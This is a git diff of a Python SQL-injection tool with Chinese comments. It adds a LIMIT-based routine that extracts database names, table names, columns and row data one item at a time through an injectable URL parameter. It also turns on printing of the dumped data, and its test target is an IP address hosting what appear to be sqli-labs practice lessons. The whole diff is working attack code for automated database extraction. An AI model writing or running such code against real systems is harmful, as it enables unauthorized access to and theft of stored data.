@@ -1,8 +1,9 @@
-import sys
+#!/bin/env python3
 from lib.core.function.get_info import *
 from lib.core.function.payload import *
 from lib.database.data_storage import *
 from lib.output.output import *
+from lib.core.function.pyload2 import *
 import random
 
 class Injection():
@@ -17,6 +18,7 @@ class Injection():
     _serial_num = 0 # 探测第几号有信息回显
     _magic_str = '' # 魔力字符串
     _url_ready = '' # 预处理url
+    payload2 = None
 
     def __init__(self, url, arguments ,pre_payload=''):
         self._magic_str = "$$$$$$$$$$$$$$$$$"
@@ -25,6 +27,7 @@ class Injection():
         self.url = url
         self.page_info = PageInfo(url)
         self.payload = Payload(pre_payload)
+        self.payload2 = Payload2(pre_payload)
         self.output = Output()
         self.arguments = arguments
 
@@ -91,9 +94,14 @@ class Injection():
 
 
     def _get_databases(self):
-        databases = self._analysis_data()
+        databases = self._analysis_data2()[0]
         print("数据库库名爆破：" + str(databases))
-        self.database.add_database(databases)
+        # 由于limit payload问题，将不再进行系统库探测
+        clean_databases = []
+        for db in databases:
+            if db != "information_schema" and db != "mysql" and db != "performance_schema":
+                clean_databases.append(db)
+        self.database.add_database(clean_databases)
 
     def _get_tables(self, database=[]):
         databases = []
@@ -102,7 +110,7 @@ class Injection():
         else:
             databases = self.database.get_databases()
         for db in databases:
-            tables = self._analysis_data(db)
+            tables = self._analysis_data2(db)[0]
             print("数据库：" + db)
             print("\t tables: " + str(tables))
             self.database.add_tables(db, tables)
@@ -118,16 +126,16 @@ class Injection():
         if database != '' and len(table) != 0:
             # 单独搜索
             for tb in table:
-                columns = self._analysis_data(database, tb)
+                columns = self._analysis_data2(database, tb)[0]
                 self.database.add_column(database, tb, columns)
         else:
             # 全部搜索
             for db in self.database.get_databases():
                 for tb in self.database.get_tables(db):
-                    columns = self._analysis_data(db, tb)
-                    # print("database: "  + db)
-                    # print("\ttable: " + tb)
-                    # print("\t\t columns: " + str(columns))
+                    columns = self._analysis_data2(db, tb)[0]
+                    print("database: "  + db)
+                    print("\ttable: " + tb)
+                    print("\t\t columns: " + str(columns))
                     self.database.add_column(db, tb, columns)
 
     def _get_data(self, database='', table='', columns=[]):
@@ -142,21 +150,21 @@ class Injection():
         if len(database) != 0 and len(table) != 0 and len(columns) != 0:
             # 指定搜索
             # 查找到所有数据，每一行以空格相隔, 每行数据以逗号相隔
-            data = self._analysis_data(database, table, columns, ' ')
+            data = self._analysis_data2(database, table, columns)
             for data_line in data:
-                self.database.add_data(database, table, columns, data_line.split(','))
+                self.database.add_data(database, table, columns, data_line)
         else:
             # 搜索所有库的所有表的所有列的所有数据
             for db in self.database.get_databases():
                 for tb in self.database.get_tables(db):
                     columns = self.database.get_columns(db, tb)
-                    data = self._analysis_data(db, tb, columns)
+                    data = self._analysis_data2(db, tb, columns)
                     for data_line in data:
-                        # print("database: " + db)
-                        # print("\ttable:" + tb)
-                        # print("\t\tcolumns: " + str(columns))
-                        # print("\t\t\tdata: " + data_line)
-                        self.database.add_data(db, tb, columns, data_line.split('`'))
+                        print("database: " + db)
+                        print("\ttable:" + tb)
+                        print("\t\tcolumns: " + str(columns))
+                        print("\t\t\tdata: " + str(data_line))
+                        self.database.add_data(db, tb, columns, data_line)
 
     def _analysis_data(self, database='', table='', columns=[], split_char=','):
         '''
@@ -176,6 +184,46 @@ class Injection():
         print(result)
         return result.split(split_char)
 
+    def _analysis_data2(self, database='', table='', columns=[]):
+        '''
+        使用limit格式进行一列一列 取数据
+        Args:
+            databases: str,库名
+            table: str, 表名
+            columns: list, 所需列的数据
+        '''
+        if len(columns) == 0:
+            columns = ['']
+
+        # 得到库*的总数
+        payload = self.payload2.count_list(self._probe_num, self._serial_num, database, table, columns[0])
+        url_malformation = self._url_ready.replace(self._magic_str, str(payload))
+        print("\033[33m%s\033[0m" % (url_malformation))
+        result = self.page_info.get_info(url_malformation)
+        if result == '':
+            self.output.error(F"result 结果异常,url: {url_malformation}")
+        num_limit = int(result) # 表示当前库*有多少
+        if (num_limit) == 0:
+            pass
+        result_all = []
+        for i in range(num_limit): # i表示当前limit到第几行（列)
+            result = []
+            for j in range(len(columns)):
+                payload = self.payload2.union_sql_2(self._probe_num, self._serial_num, database, table, columns[j], i)
+                url_malformation = self._url_ready.replace(self._magic_str, str(payload))
+                print("\033[33m%s\033[0m" % (url_malformation))
+                result.append(self.page_info.get_info(url_malformation))
+            result_all.append(result)
+        print()
+        # if columns[0] == '': result_all == [ ['database1'], ['database2']... ] 
+        # else   : result_all == [ ['data1', 'data2' .. ], ['', '' ...] ...]
+        if columns[0] == '': # 表示要得到库名，列名等
+            return [ [ ''.join(x) for x in result_all ] ]
+        else:                # 表示得到具体数据
+            return result_all
+
+
+
     def _get_serial_num(self):
         randnum_list = []
         # 生成随机数字字符串
@@ -193,7 +241,7 @@ class Injection():
 
 
 if __name__ == '__main__':
-    inject = Injection('http://47.95.4.158:8002/Less-3/?id=2', '\') ')
+    inject = Injection('http://47.95.4.158:8002/Less-4/?id=2', None, pre_payload=" \") ")
     # inject.exec_payload(1, 5, 'information_schema', 'CHARACTER_SETS')
     inject.exec_payload(1, 4)
 
